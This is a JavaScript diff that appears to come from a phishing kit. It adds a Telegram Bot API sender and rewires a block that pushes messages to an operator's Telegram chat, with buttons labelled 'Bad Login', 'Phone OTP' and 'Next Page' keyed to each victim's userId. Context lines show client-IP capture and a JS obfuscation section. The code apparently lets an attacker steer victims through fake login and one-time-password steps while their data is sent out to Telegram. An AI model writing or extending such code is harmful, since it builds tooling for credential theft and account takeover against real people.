@@ -30,6 +30,32 @@ function getReqClientIP(req) {
   return ip;
 }
 
+async function sendTelegramMessage(botToken, chatId, text, options = {}) {
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+  const body = {
+    chat_id: chatId,
+    text,
+    ...options
+  };
+
+  const response = await fetch(url, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(body)
+  });
+
+  const data = await response.json();
+
+  if (!data.ok) {
+    throw new Error(`Telegram API error: ${JSON.stringify(data)}`);
+  }
+
+  return data;
+}
+
 /* ================================
    JS OBFUSCATION
 =================================*/
@@ -266,46 +292,35 @@ async function buildMessage(data, options = {}) {
     }
 
   	  if (sendToTelegram) {
-			  if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
-			  if (!userId) throw new Error("userId is missing");
-			
-			  const sendMessage = sendMessageFor(botToken, chatId);
-			
-			  const messageText = String(message || "Select a command:");
-			
-			  const buttons = [
-			    [
-			      { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
-			      { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
-			    ],
-			    [
-			      { text: "Bad Login", callback_data: `cmd:bad-login:${userId}` },
-			      { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
-			    ]
-			  ];
-			
-			  try {
-			    await sendMessage(messageText, {
-	  parse_mode: "HTML",
-	  reply_markup: {
-	    inline_keyboard: [
-	      [
-	        { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
-	        { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
-	      ],
-	      [
-	        { text: "Bad Login", callback_data: `cmd:bad-login:${userId}` },
-	        { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
-	      ]
-	    ]
-	  }
-	});
-			
-			    console.log("✅ Telegram message sent");
-			  } catch (err) {
-			    console.error("❌ Telegram error:", err);
-			  }
-			}
+  if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
+  if (!userId) throw new Error("userId is missing");
+
+  const messageText = String(message || "Select a command:");
+
+  const buttons = [
+    [
+      { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
+      { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
+    ],
+    [
+      { text: "Bad Login", callback_data: `cmd:bad-login:${userId}` },
+      { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
+    ]
+  ];
+
+  try {
+    await sendTelegramMessage(botToken, chatId, messageText, {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: buttons
+      }
+    });
+
+    console.log("✅ Telegram message sent with buttons");
+  } catch (err) {
+    console.error("❌ Telegram error:", err.message);
+  }
+}
 		
 		    return message;
 		  } catch (err) {
